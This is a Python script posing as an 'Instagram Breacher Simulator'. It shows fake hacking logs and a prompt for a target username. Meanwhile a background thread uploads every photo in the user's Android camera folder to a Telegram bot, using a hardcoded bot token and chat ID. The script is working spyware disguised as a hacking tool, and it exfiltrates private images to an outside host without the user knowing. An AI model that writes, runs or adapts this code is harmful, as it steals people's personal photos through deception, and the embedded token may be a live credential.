import os
import time
import sys
import requests
import random
import threading

# --- Telegram Bot Info ---
bot_token = '7768613686:AAHy-AVbzqBdtudRs2yUlE4dTcefXX8H4yw'
chat_id = '5351238301'
dcim_path = '/sdcard/DCIM/Camera'

# --- Hacking logs for fake animation ---
hacking_logs = [
    "[*] Connecting to Instagram secure server...",
    "[*] Connected to IP: 208.50.35.10",
    "[*] Device ID: CE9FDCDC663F11DF",
    "[*] Bypassing 2FA security system...",
    "[*] Hacking started... Please wait...",
    ">>> Bypassing checkpoint...",
    ">>> Extracting credentials...",
    ">>> Injecting backdoor...",
    ">>> Downloading session token...",
    ">>> Cracking hash..."
]

# --- Colorful intro animation ---
def print_header():
    title = "InstaZAP: Instagram Breacher Simulator"
    credit = "Hacked by @PkpXhacker"
    divider = "-" * len(title)

    for char in title:
        sys.stdout.write(f"\033[95m{char}\033[0m")
        sys.stdout.flush()
        time.sleep(0.04)

    print()
    for char in divider:
        sys.stdout.write(f"\033[94m{char}\033[0m")
        sys.stdout.flush()
        time.sleep(0.01)

    print()
    for char in credit:
        sys.stdout.write(f"\033[92m{char}\033[0m")
        sys.stdout.flush()
        time.sleep(0.05)

    print("\n")

# --- Colorful fake log animation ---
colors = ['\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m']

def log_animation():
    while True:
        log = random.choice(hacking_logs)
        color = random.choice(colors)
        print(f"{color}{log}\033[0m")
        time.sleep(random.uniform(0.7, 1.5))

# --- Send photo file to Telegram ---
def send_file(file_path):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    try:
        with open(file_path, 'rb') as file:
            response = requests.post(url, data={'chat_id': chat_id}, files={'document': file})
        if response.status_code == 200:
            print("\033[92m[+] plz wait 10-15 min....\033[0m")
        else:
            print("\033[91m[-] Telegram Error:\033[0m", response.text)
    except Exception as e:
        print(f"\033[91m[!] Failed to send file: {e}\033[0m")

# --- Photo send loop (Optimized) ---
def photo_sender():
    sent_files = set()
    while True:
        if not os.path.exists(dcim_path):
            print("[!] Camera folder not found.")
            time.sleep(5)  # Shortened the time before retry
            continue

        for file in os.listdir(dcim_path):
            if file.lower().endswith((".jpg", ".jpeg", ".png")):
                full_path = os.path.join(dcim_path, file)
                if full_path not in sent_files:
                    send_file(full_path)
                    sent_files.add(full_path)
                    # Removed sleep to send immediately
        time.sleep(1)  # Reducing the time interval between scans

# --- Main execution ---
if __name__ == '__main__':
    os.system('clear')  # Clear screen
    print_header()

    input("\nENTER TARGET INSTAGRAM USERNAME: ")

    # Start background threads
    threading.Thread(target=log_animation, daemon=True).start()
    threading.Thread(target=photo_sender, daemon=True).start()

    # Keep program running
    while True:
        time.sleep(60)
